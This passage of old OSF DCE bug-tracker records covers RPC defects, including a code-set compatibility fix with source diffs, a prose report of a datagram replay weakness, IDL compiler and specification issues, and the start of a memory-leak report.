CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : i18n char set compatiblity check fails accross platforms
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17939
reference     
abstract      i18n char set compatibility check fails across platforms
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    osf                 
level                                     phaseInject                       

addDate       95/10/21 19:49:22           assignDate    95/10/23 10:18:22   
lastUpdate    95/10/23 10:18:22           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 19:49:22    open            trumble (Trumble, Mary K.)
    95/10/23 10:18:22    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 19:49:22, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
When both "to" and "from" code sets are not in the local (host)
registry, character set compatibility checking fails.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This failure can not be demonstrated on a current build, as installed.
To demonstrate the problem on OS/2 DCE, install the application client and
server on separate machines.  Run the client and server in processes that
have different code sets which support a common character set.  Replace
the IBM code set registry database on the client with a database
that does not contain the code set of the server process.  Replace the
server's IBM code set registry database with one that does not contain
the code set of the client.  Code set conversion will fail with a
compatibility check error.

ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***N/A***

- Client machine:                   Server machine:
    System (OS/2 -or- AIX):             System (OS/2 -or- AIX):
    Operating System Level:             Operating System Level:
    Hardware Model:                     Hardware Model:
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):                  MPTS Level (OS/2):
    DCE Build Level:                    DCE Build Level:
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
This problem is caused by an OSF design or architecture problem with
RFC 41.2.

The code attempts to find the server's character set information in
the client's local code set registry.  If the server's code set is
not supported on the client machine, the compatibility check fails.

What *should* happen: Though the server code set is not present, the
client should verify that the code sets are compatible, and it should
convert into the universal code set.

The RFC is ambiguous with respect to the location of the
character set information.  We suspect that the original design point
was to export the character set information to CDS, along with the
code set.  The client could then get the information from the namespace.
Initial code inspection reveals that the necessary infrastructure is in
place to support this design point.

It looks like the design point was changed late in the game, to require
that all machines have identical code set registries.  This is not an
acceptable design point, and even if it were, nothing has been done to
implement it in the 1.1 release.



DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): any cross-vendor environment

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------
Cathy Wang is continuing a detailed code review to verify the feasibility
of a design that uses the CDS namespace to communicate character set
information between the client and server.

This defect can not occur in a pure OS/2 DCE environment, but it should
be fixed before shipping OS/2 DCE.

There are IDD impacts.


REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

[12/20/95 public]
Modified the Priority since this is a design issue not a code issue.


    <Note by cwang (Cathy Wang), 1996/02/23 16:11:44, action: note>
IBM has implemented the fix for this defect and will post the following
propoal to OSF and i18n forum:

Hi,

  Last fall we prototyped a solution to the character set compatibility
  check problem (OT 13164).  When we scaled up the prototyped solution,
  we hit size restrictions in the CDS namespace.  Subsequently, we
  implemented 3 alternative solutions that avoid this namespace problem.
  We now would like to present all the alternatives and a recommendation to you.
  Note that all the alternative solutions are trying to change the
  data structure of the code set info (rpc_codeset_mgmt_s_t).  The
  changes to the rpc_cs_set_compat_check() API remains the same as
  originally proposed.


Original proposal:

 A. Changes:

 1. Modify the data structure of code set info:
    -----------------------------------------
    Expand the data structure rpc_codeset_mgmt_t (declared in rpc.idl) to:

    #define CS_CSRC_MAX_CHAR_SETS    15 /* this is defined in csrc.h */
    typedef struct rpc_cs_c_set_s_t {
        unsigned32    c_set;
        unsigned16    ch_sets_num;
        unsigned16    ch_sets[CS_CSRC_MAX_CHAR_SETS];
        unsigned16    c_max_bytes;
    } rpc_cs_c_set_t;
    typedef struct rpc_codeset_mgmt_s_t {
        unsigned32        version;       /* version of this structure */
        unsigned32        count;    /* number of code sets defined */
        [size_is(count)] rpc_cs_c_set_t codesets[];
    } rpc_codeset_mgmt_t, *rpc_codeset_mgmt_p_t;

 2. Modify APIs:
    -----------
    Change the interface of rpc_cs_char_set_compat_check() which is a PUBLIC
    API to:

     #include <dce/rpc.h>
     void rpc_cs_char_set_compat_check(
     rpc_codeset_mgmt_p_t        client_code_sets_array,
     rpc_codeset_mgmt_p_t        server_code_sets_array,
     error_status_t         *status);
     where:
       client_codesets_array and server_codesets_array are integer
       arrays that specify the code sets and char sets that the
       client's or server's host environment supports.   The array
       structure is defined above.

 B. Advantages/Disadvantages:

    Advantages:
      The data is un/marshalled in "byte", this is the most compact way to
      be stored in the CDS Name Space, i.e., no overhead to store node
      information for the un/marshaller.

    Disadvantages:
      1) Un/pickling Porting issue

         Data is un/marshalled in byte causing alignment problems, as
         Seiichi Tsu (HP) commented:

           "The current un/pickling code for rpc_codeset_mgmt_t, defined in
           rpc/sys_idl/codesets.idl, treat it as a simple array of bytes. This
           is just wrong. Since each system/compiler has different alignment/
           padding rule for a structure/array, the RPC_Codesets attribute won't
           be portable. (Of course, the endian-ness is another issue,but at SIG
           you were saying "big-endian"? :-) If IBM is going to fix
           rpc_codeset_mgmt_t in an incompatible way, why not fix codesets.idl
           and make the RPC_Codesets attribute portable?"

      2) Size restrictions in the CDS Namespace

         Hit the size restrictions in the CDS namespace (max number of bytes
         to be stored in CDS entry is 4000) with 15 elements for the
         "ch_sets" array.

      3) Flexibilitity

         Fixed number of array for "ch_sets" CAN NOT support vendor who
         may have very small set of codesets but each codeset have
         very large set of character sets.


Alternative #1 - the recommended proposal:

 A. Changes:

    Modify the data structure of code set info:
    ------------------------------------------
    Extract the rpc_codeset_mgmt_t declarations from rpc.idl and
    create a new idl file: cs_mgmt.idl, which will be imported by
    both rpc.idl and codesets.idl.

    Here are the changes made to cs_mgmt.idl, rpc.idl and codesets.idl:

    cs_mgmt.idl:
    -----------

    [
       uuid(ec267c61-4c7a-11cf-8228-000233002b3e),
       version(1.0)
    ]
    interface codeset_mgmt
    {
    /*
     * R P C _ C O D E S E T _ M G M T _ T
     *
     * Data structure to hold (server's or client's) supported code sets
     * Each code set has an attribute (max bytes) to indicate the maximum
     * number of bytes needed to encode that code set.  This is used to
     * calculate the size of a necessary buffer for code set conversion.
     */
    typedef struct rpc_cs_c_set_s_t {
            unsigned32      c_set;
                unsigned16      c_max_bytes;
            unsigned16      ch_sets_num;
            [ptr, size_is(ch_sets_num)] unsigned16      * ch_sets;
    } rpc_cs_c_set_t;
    typedef struct rpc_codeset_mgmt_s_t {
            unsigned32      version;        /* version of this structure */
            unsigned32      count;          /* number of code sets defined */
            [size_is(count)] rpc_cs_c_set_t codesets[];
    } rpc_codeset_mgmt_t;
    typedef [ptr] rpc_codeset_mgmt_t *rpc_codeset_mgmt_p_t;
    }


    rpc.idl:
    -------

    Add the following line to the rpc.idl and remove the portion which is now
    the cs_mgmt.idl.

    import "cs_mgmt.idl";

    codesets.idl:
    ------------

    [
    uuid(35a38fce-b5d1-11cc-af6f-08000925d3fe),
    version(2.0)
    ]
    interface codesets
    {

    import  "cs_mgmt.idl";

    /*
     *  Maximum number of bytes to be stored in CDS entry.
     *  4000 is defined as MAXATTRIBUTE in dns_record.h.  However, since there
     *  is no IDL file which defines this value, there is no way to include
     *  that information from this file.
     */
    const long nsi_max_attribute_len = 4000;

    /*
     * R P C __ C O D E S E T S _ T O _ N S C O D E S E T S
     *
     * Encode code sets with IDL encoding services for storing in CDS
     */

    void rpc__codesets_to_nscodesets (
            [in] handle_t                   h,
            [in] rpc_codeset_mgmt_p_t       cp
    );
    /*
     * R P C __ N S C O D E S E T S _ T O _ C O D E S E T S
     *
     * Decode code sets with IDL encoding services.
     */

    void rpc__nscodesets_to_codesets (
            [in] handle_t                   h,
            [out] rpc_codeset_mgmt_p_t      *cp
    );
    }

 B. Advantages/Disadvantages:

    Advantages:
      1) Un/pickling Porting issue

         We will un/pickling the data structure rpc_codeset_mgmt_s_t instead
         of byte.  See the changes made to codesets.idl.

      2) Flexibilitity

        Look at the changes in the data structure rpc_cs_c_set_s_t. We changed
        the "ch_sets" into pointer to dynamically malloc'ed character sets.
        This approach allows the support of vendors who may have small set of
        code sets but large set of charactes sets.

    Disadvantages:
      1) More changes to the public interface:

         The call signatures for rpc__codesets_to_nscodesets() and
         rpc__nscodesets_to_codesets() have changed in codesets.idl.

         The declarations of rpc_cs_mgmt_s_t need to be extracted from
         rpc.idl into a new idl file so that it can be imported by
         both rpc.idl and codesets.idl.

      2) Overhead bytes get stored in Name Space

         Un/marshalling "rpc_cs_c_set_t.ch_sets" which is  a pointer to
         dynamically allocated character sets will cause some overhead
         nodes informations to get stored/retrieved from the Name Space.
         There is 4 byte boundary for un/marshalled data.  We found that
         the bytes of a rpc_cs_c_set_s_t in the Name Space in general
         looks like this:
           4 bytes - c_set
           2 bytes - c_max_bytes
           2 bytes - ch_sets_num
           4 bytes - NSI pointer (node)
           4 bytes - number of ch_sets, this is also a NSI node
           4 bytes or more - data (in 4 byte boundary)

Alternative #2:

 A. Changes:

    All the changes are the same as Alternative #1, except
    the ch_sets is declared as a variable array:

    typedef struct rpc_cs_c_set_s_t {
            unsigned32      c_set;
            unsigned16      c_max_bytes;

            unsigned16      ch_sets_num;
            [length_is(ch_sets_num)] unsigned16      ch_sets[CS_CSRC_MAX_CHAR_ETS)];
   } rpc_cs_c_set_t;
    typedef struct rpc_codeset_mgmt_s_t {
            unsigned32      version;        /* version of this structure */
            unsigned32      count;          /* number of code sets defined */
            [size_is(count)] rpc_cs_c_set_t codesets[];
    } rpc_codeset_mgmt_t,  *rpc_codeset_mgmt_p_t;
    }

 B. Advantages/Disadvantages:

      It has all the advantages of alternative #1, plus theoriticaly, it will
      not have the overhead of storing the NSI pointer(node) in the CDS NameSpce.    According to DCE Appl Dev Guide: "The length_is attribute is one of
      the attributes that can be used to allow the amount of data in an
      array that will be transmitted to be determined at runtime."
      This does NOT appear to be true,
      ch_sets is defined in the IDL-generated cs_mgmt.h as
      unsigned16 ch_sets[15]; just the same as the fixed number array
      in the original proposal.  The CDS NameSpace entry for the code set
      looks just the same as the original proposal as well.  This approach
      does not solve the alighment problem, either.


Alternative #3:

 A. Changes:

      All the changes are the same as the original proposal with maximum numof char set < 15.

 B. Advantages/Disadvantages:

      For the IBM registry maximum number character sets would have to be <5,
      in oder to fit in the namespace.  This is too restrictive.  This
      alternative also does not address the alighment problems.

[9/4/96  public]

Here are the diffs to fix the problem:

rpc/runtime/Makefile
--------------------
131c131
<      lbase.idl   mgmt.idl   nbase.idl  ncastat.idl  rpc.idl cs_mgmt.idl \
---
>      lbase.idl   mgmt.idl   nbase.idl  ncastat.idl  rpc.idl      \


rpc/sys_idl/codesets.idl
------------------------
62c62
< version(2.0)
---
> version(1.0)
67,69d66
< import  "dce/cs_mgmt.idl";
<
<
86c83,84
<         [in] rpc_codeset_mgmt_p_t       cp
---
>   [in] long           num,
>   [in, size_is(num)] byte     codesets[]
97c95,96
<         [out] rpc_codeset_mgmt_p_t      *cp
---
>   [in, out] long          *num,
>   [out, size_is(*num)] byte   codesets[]

rpc/sys_idl/rpc.idl
-------------------
104d103
< import "dce/cs_mgmt.idl";
106d104
<
1449a1448,1458
> typedef struct rpc_cs_c_set_s_t {
>   unsigned32  c_set;
>   unsigned16  c_max_bytes;
> } rpc_cs_c_set_t;
>
> typedef struct rpc_codeset_mgmt_s_t {
>   unsigned32      version;    /* version of this structure */
>   unsigned32  count;      /* number of code sets defined */
>   [size_is(count)] rpc_cs_c_set_t codesets[];
> } rpc_codeset_mgmt_t, *rpc_codeset_mgmt_p_t;
>
1451,1454d1459
<  * Move the code set management structures: rpc_cs_c_set_t and
<  * rpc_codeset_mgmt_t to cs_mgmt.idl.  CMVC 17939 (OT13164)
<  */
< /*
1592,1593c1597,1598
<     [in]        rpc_codeset_mgmt_p_t            client_code_sets_array,
<     [in]        rpc_codeset_mgmt_p_t            server_code_sets_array,
---
>     [in]  unsigned32          client_codeset,
>     [in]  unsigned32          server_codeset,

new file added to rpc/sys_idl:  cs_mgmt.idl
                  -------------------------
1,47d0
< /*
<  * COMPONENT_NAME:  rpc.idl.src
<  *
<  * FUNCTIONS:
<  *
<  * ORIGINS: 72
<  *
<  */
< /*
<  * HISTORY
<  * $Log:	c013164,v $
# Revision 1.5  96/09/04  11:50:07  root
# changed fields:  new/changed/deleted note(s) [cwang 9/4/96 public]
# 
<  *
<  * CR: 13164 (IBM cmvc 17939) 1996/01/29      cwang
<  *     Extracted from rpc.idl for RPC runtime I18N support.
<  *
<  * $EndLog$
<  */
<
< [
<     uuid(ec267c61-4c7a-11cf-8228-000233002b3e),
<     version(1.0)
< ]
< interface codeset_mgmt
< {
< /*
<  * R P C _ C O D E S E T _ M G M T _ T
<  *
<  * Data structure to hold (server's or client's) supported code sets
<  * Each code set has an attribute (max bytes) to indicate the maximum
<  * number of bytes needed to encode that code set.  This is used to
<  * calculate the size of a necessary buffer for code set conversion.
<  */
< typedef struct rpc_cs_c_set_s_t {
<   unsigned32  c_set;
<   unsigned16  c_max_bytes;
<   unsigned16  ch_sets_num;
<   [ptr, size_is(ch_sets_num)] unsigned16      * ch_sets;
< } rpc_cs_c_set_t;
< typedef struct rpc_codeset_mgmt_s_t {
<   unsigned32  version;    /* version of this structure */
<   unsigned32  count;      /* number of code sets defined */
<   [size_is(count)] rpc_cs_c_set_t codesets[];
< } rpc_codeset_mgmt_t;
< typedef [ptr] rpc_codeset_mgmt_t *rpc_codeset_mgmt_p_t;
< }


rpc/runtime/cs_s_eval.c
-----------------------
459,460c459,460
<                         method_p->client,
<                         method_p->server,
---
>           method_p->client->codesets[0].c_set,
>           method_p->server->codesets[0].c_set,
752,753c752,753
<                         method_p->client,
<                         method_p->server,
---
>           method_p->client->codesets[0].c_set,
>           method_p->server->codesets[0].c_set,
904,906c904,905
< **    client_code_sets_array
< **                        Array containing all of the information for the
< **                        client's supported codesets.
---
> **    client_codeset      OSF code set registry value for client's current
> **                code set.
908,910c907,908
< **    server_code_sets_array
< **                        Array containing all of the information for the
< **                server's supported codesets.
---
> **    server_codeset      OSF code set registry value for server's current
> **                code set.
936,937c934,935
<         rpc_codeset_mgmt_p_t            client_code_sets_array,
<         rpc_codeset_mgmt_p_t            server_code_sets_array,
---
>   unsigned32      client_codeset,
>   unsigned32      server_codeset,
941,943c939,941
< (client_code_sets_array, server_code_sets_array, status)
<         rpc_codeset_mgmt_p_t            client_code_sets_array,
<         rpc_codeset_mgmt_p_t            server_code_sets_array,
---
> (client_codeset, server_codeset, status)
>   unsigned32      client_codeset;
>   unsigned32      server_codeset;
946d943
<
947a945
>   unsigned_char_t *client_code_set_name;
949a948
>   unsigned_char_t *server_code_set_name;
953,956c952,957
<   client_char_sets_number = client_code_sets_array->codesets[0].ch_sets_num;
<   c_sets_save = client_char_sets_value = client_code_sets_array->codesets[0].ch_sets;
<   server_char_sets_number = server_code_sets_array->codesets[0].ch_sets_num;
<   s_sets_save = server_char_sets_value = server_code_sets_array->codesets[0].ch_sets;
---
>   dce_cs_rgy_to_loc (
>       client_codeset,
>       &client_code_set_name,
>       &client_char_sets_number,
>       &client_char_sets_value,
>       status );
957a959,960
>   if (*status != dce_cs_c_ok)
>       return;
958a962,978
>   c_sets_save = client_char_sets_value;
>
>   dce_cs_rgy_to_loc (
>       server_codeset,
>       &server_code_set_name,
>       &server_char_sets_number,
>       &server_char_sets_value,
>       status );
>
>   if (*status != dce_cs_c_ok)
>   {
>       free(c_sets_save);
>       return;
>   }
>
>   s_sets_save = server_char_sets_value;
>
992a1013,1014
>   free(c_sets_save);
>   free(s_sets_save);
1163,1164d1184
<
<         rpc_ns_mgmt_free_codesets(&client, status);



rpc/runtime/cs_s_reg.c
----------------------
920,921d919
<         entry_t         **epptmp;
<         int             j;
931c929
<   epptmp = epp = rpc_g_codesets_sort_by_priority;
---
>   epp = rpc_g_codesets_sort_by_priority;
945,969d942
<         for (i=0;i<(rpc_g_codesets_effective_count);i++) {
<                 RPC_MEM_ALLOC (
<                         (*codesets_p)->codesets[i].ch_sets,
<                         unsigned16 *,
<                         (sizeof(unsigned16)) * ((*epptmp)->char_sets_num),
<                         RPC_C_MEM_CDS_ATTR,
<                         RPC_C_MEM_WAITOK);
<           if ( (*codesets_p)->codesets[i].ch_sets == NULL){
<                         for (j=0;j<i;j++) {
<                                RPC_MEM_FREE  (
<                                (*codesets_p)->codesets[j].ch_sets,
<                                RPC_C_MEM_CDS_ATTR);
<                                (*codesets_p)->codesets[j].ch_sets = NULL;
<                         }
<                         RPC_MEM_FREE (*codesets_p, RPC_C_MEM_CDS_ATTR);
<                         *codesets_p = NULL;
<
<                   *status = rpc_s_no_memory;
<                   return;
<                 }
<
<             epptmp++;
<         }
<
<
1003a977
>
1005,1008d978
<                         (*codesets_p)->codesets[i].ch_sets_num = (*epp)->char_sets_num;
<                         for (j=0; j<(*epp)->char_sets_num;j++ )
<                         {
<                            (*codesets_p)->codesets[i].ch_sets[j] = (*epp)->char_sets[j];
1010,1011d979
<
<       }
1015,1019d982
<                         (*codesets_p)->codesets[0].ch_sets_num = (*epp)->char_sets_num;
<                         for (j=0; j<(*epp)->char_sets_num;j++ )
<                         {
<                            (*codesets_p)->codesets[0].ch_sets[j] = (*epp)->char_sets[j];
<                         }


rpc/runtime/cs_s_stub.c
-----------------------
2364,2365c2364,2365
<                                 client,
<                                 server,
---
>               client->codesets[0].c_set,
>               server->codesets[0].c_set,


rpc/runtime/ns_s_attr.c
-----------------------
219c219,222
<         rpc__codesets_to_nscodesets(es_h, (rpc_codeset_mgmt_t *)codeset_val);
---
>       encoding_size = sizeof(codeset_val->version) +
>               sizeof(codeset_val->count)   +
>               sizeof(codeset_val->codesets[0]) * codeset_val->count;
>       rpc__codesets_to_nscodesets(es_h, encoding_size, (idl_byte *)codeset_val);
221d223
<
505d506
<     rpc_codeset_mgmt_p_t    *temp_value;
564,572c565,571
<             temp_value = (rpc_codeset_mgmt_p_t *)value;
<
<             RPC_MEM_ALLOC (
<                   *temp_value,
<                   rpc_codeset_mgmt_p_t,
<                   nsi_out_length,
<                   RPC_C_MEM_CDS_ATTR,
<                   RPC_C_MEM_WAITOK);
<           if (*temp_value == NULL){
---
>           RPC_MEM_ALLOC (
>               *value,
>               unsigned_char_p_t,
>               nsi_out_length,
>               RPC_C_MEM_CDS_ATTR,
>               RPC_C_MEM_WAITOK);
>           if (*value == NULL){
580c579
<             rpc__nscodesets_to_codesets(es_h, temp_value);
---
>           rpc__nscodesets_to_codesets(es_h, (idl_long_int *)length, (idl_byte *)(*value));
582d580
<
954,955d951
<     int     i;
<
957,967d952
<
<     for (i=0;i<((*codesets)->count);i++)
<     {
<         if (((*codesets)->codesets[i].ch_sets) != NULL)
<         {
<         RPC_MEM_FREE (
<             (*codesets)->codesets[i].ch_sets,
<             RPC_C_MEM_CDS_ATTR);
<         (*codesets)->codesets[i].ch_sets = NULL;
<         }
<     }



CR Number                     : 13158
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : dg authn
Short Description             : datagram protocol vulnerable
	to within-call replays if fragnos wrap
Reported Date                 : 10/20/95
Found in Baseline             : 1.0
Found Date                    : 10/20/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/20/95 public]

The authentication used by the RPC datagram protocol is vulnerable to
replays if fragment numbers wrap around.  This happens after 2^16 packets
(~2^26 bytes) of data, and the vulnerability is that an attacker could
substitute an earlier fragment in place of the "correct" one.

Fixing this requires a protocol change, but the change need not be visible
to calls which send less than 2^16 fragments.

This is a C2 because the workaround is "don't do that" :-).

[10/23/95 public]

From AES, 12.5.1 Connectionless PDU Structure:

 If fragment numbers wrap around and are reused, the implementation must
 assure that these are unambiguous (for example, the first 50% of fragments
 must have been acknowledged).

So, I think that the attacker can't replace earlier fragments because
replays (acknowledged fragments) are dropped. Am I missing something here?

[10/23/95 public]

Oh, I got it. The attacker just resends an old fragment. Hmm, quite
interesting to see a sender's behavior if a serial number in a fack doesn't
match...



CR Number                     : 13153
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : app_gd
Short Description             : info needed for union and
struct types
Reported Date                 : 10/13/95
Found in Baseline             : 1.1
Found Date                    : 10/13/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : RPC (idl chapter)
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/13/95 public]

From: Rich Salz <rsalz>
Date: Wed, 11 Oct 1995 12:56:29 -0400
To: harvey, mpt
Subject: Re: DCE IDL - more on name overloading
Cc: crawley@dstc.edu.au

More AES bugs to be fixed via DCE 1.2

---------- Begin Forwarded Message ----------

The AES text does not mention some "obvious" restrictions on the use
of identifiers:
  o parameter names should be unique in the parameter list of an
    operation or function type spec.
  o arm names should be unique in an case list
  o field names should be unique in a struct field list
  o union and struct tag names should be unique within an interface

I don't think the App Dev Guide does either..

Finally, neither the AES or the App Dev Guide says whether tag names
for typedef'ed union and struct types are imported, or whether
imported definitions can be redeclared.  Indeed, the AES gives the
syntax only for import!

-- Steve

-----------
Who is Steve??


Steve Crawley, crawley@dstc.edu.au, is a member of DSTC a research
co-op in australia.  They're OSF members, maybe DCE licensees.  He's
got the free IDL stuff and is building some tools on top of it.

He is asking me (and Art H.) questions, as he runs into variances
between the 1.1 docs, the AES, and the idl compiler.  Code bugs I
am opening OT's for.  AES issues I am sending to Art.  I don't know
how you want to open OT's for AES work, which we (not HP or Digital)
own.  I know Art has already got a handful of fixes, so I've been assuming
that sending him (and maybe others) email is good enough to make sure that
these things don't get lost.
        /r$

[10/13/95 public]
Corrected Margaret Taft's email address.

[10/16/95 public]

Recorrected Margaret Taft's email address from mwt@hp.apollo.com to
mwt@apollo.hp.com.

[11/25/96 public]

Chapter 4 (IDL) of the RPC CAE Specification has been updated at 1.1
with the above information.  There are currently no plans for updating
the AES.



CR Number                     : 13150
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl_compiler
Short Description             : field and structure name problem
Reported Date                 : 10/11/95
Found in Baseline             : 1.1
Found Date                    : 10/11/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/11/95 public]
 { Please note the Interest list above. }

According to the AES, section 4.2.1.2.1 the following should work:
    interface t1a
    {
      typedef enum {foo} baz;

      typedef struct {
	long foo;
      } bar;
    }

But it doesn't.  Reversing the order works:
    interface t1b
    {
      typedef struct {
	long foo;
      } bar;

      typedef enum {foo} baz;
    }

[10/11/95 public]

>It appears that the IDL compiler gives a (spurious IHMO) error when
>you declare an operation, struct or union after a constant, enumeration
>or operation, where the name of a param, field or arm (respectively)
>of the former overloads the identifier for the latter.  Examples
>are in the attached test file.
>
>Also it appears that the IDL compiler does not check that a union's
>discriminator name and union name are not the same (at least in the
>parse phase).  I think this will lead to C compilation errors if not
>picked up.

More field/struct-union-enum namespace problems:

interface t1a
{

/* struct field overloads enum identifier */
  typedef enum {n1} E1;

  typedef struct {
    long n1;
  } S1;


/* enum identifier overloads struct field */
  typedef struct {
    long n2;
  } S2;

  typedef enum {n2} E2;


/* struct tag name overloads enum identifier */
  typedef enum {n3} E3;

  typedef struct n3 {
    long f3;
  } S3;


/* enum identifier overloads struct tag name */
  typedef struct n4 {
    long f4;
  } S4;

  typedef enum {n4} E4;


/* param overloads enum identifier */
  typedef enum {n5} E5;

  void Op5([in] long n5);


/* enum identifier overloads param */
  void Op6([in] long n6);

  typedef enum {n6} E6;


/* Op overloads enum identifier */
  typedef enum {n7} E7;

  void n7([in] long a7);    /* ERROR expected here */


/* enum identifier overloads Op */
  void n8([in] long a8);

  typedef enum {n8} E8;     /* ERROR expected here */


/* typedef overloads enum identifier */
  typedef enum {n9} E9;

  typedef long      n9;     /* ERROR expected here */

/* enum identifier overloads typedef */
  typedef long      n10;     

  typedef enum {n10} E10;   /* ERROR expected here */


/* Constant identifier overloads struct field */
  const long n11 = 1;

  typedef struct {
    long n11;
  } S11;


/* struct field overloads constant identifier */
  typedef struct {
    long n12;
  } S12;

  const long n12 = 1;


/* Constant identifier overloads param */
  const long n13 = 1;

  void Op13([in] long n13);


/* param overloads constant identifier */
  void Op14([in] long n14);

  const long n14 = 1;


/* Operation overloads struct field */
  typedef struct {
    long n15;
  } S15;

  void n15([in] long a15);


/* Struct field overloads operation */
  void n16([in] long a16);

  typedef struct {
    long n16;
  } S16;


/* Param overloads struct field */
  typedef struct {
    long n17;
  } S17;

  void Op17([in] long n17);


/* Struct field overloads param */
  void Op18([in] long n18);

  typedef struct {
    long n18;
  } S18;


/* Enum identifier has same name as typedef */
  typedef enum {E19} E19;        /* ERROR expected here */


/* struct tag overloads union tag */
  typedef union n20 switch (short s20) {
    case 1: long a20;
  } U20;

  typedef struct n20 {           
    long f20;
  } S20;                         /* ERROR expected here */


/* Enum identifier overloads union arm */
  typedef union t21 switch (short s21) {
    case 1: long n21;
  } U21;

  typedef enum {n21} E21;


/* Union arm overloads Enum identifier  */
  typedef enum {n22} E22;

  typedef union t22 switch (short s22) {
    case 1: long n22;
  } U22;


/* Union arm overloads union switch */
  typedef union t23 switch (short n23) {
    case 1: long n23;
  } U23;


/* Union name overloads union switch */
  typedef union t24 switch (short n24) n24 {
    case 1: long a24;
  } U24;                    /* ERROR expected here */
}



CR Number                     : 13144
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : doc
Inter-dependent CRs           : 13142, 13143
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : relnotes
Short Description             : remove/document/avoid idl_size_t
Reported Date                 : 10/4/95
Found in Baseline             : 1.2
Found Date                    : 10/4/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/4/95 public]

As part of the XIDL integration it was discovered/realized that idl_size_t
is an alias for size_t.  This OT suggests/request that either this 1:1
correspondence be documented in any porting info that we might
retain in 1.2 (in which case make this a doc defect) or that the code
be examined and idl_size_t be replaced with size_t.  (Perhaps some
platforms that the provider cares about don't have size_t "convenient.")

[10/6/95]
idl_size_t is not a type that is used as an RPC parameter. Its use
is to allow for the proper prototype for malloc in the memory
management APIs. There is no ndr representation for it. Therefore,
idl_size_t should be documented as such.

[10/12/95 public]

In any case, the idl_size_t datatype appears in the following DCE
Application Reference manpages:

    rpc_ss_allocate.3rpc
    rpc_ss_set_client_alloc_free.3rpc
    rpc_ss_swap_client_alloc_free.3rpc

--and in the "Interface Definition Language" (i.e., IDL) chapter
of the Application Guide core volume.

[2/4/96 public]

Assigning responsibility to myself. As I understand the situation
at the moment, idl_size_t should be documented, since it's going
to be retained. On the other hand, there is not going to be any
"porting info" as such for 1.2.1. The only place this information
could go would be the release notes somewhere (apparently it's in-
appropriate for it to be in something like rpc_intr(3rpc))



CR Number                     : 13114
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : memleak in rpc__krb_bnd_set_auth()
Reported Date                 : 9/11/95
Found in Baseline             : 1.1wp
Found Date                    : 9/11/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 1.1maint
Affected File(s)              : krbclt.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/11/95 public]

From email sent by Steve Lord:

We recently had a problem with a space leak in KRPC at a customer site -
they triggered it by changing some IP addresses whilst the system was
running, but I suspect it can happen in other ways to.

The problem is in rpc__krb_bnd_set_auth in the krbclt.c module. If this
function fails (which has to be caused by a failure return from
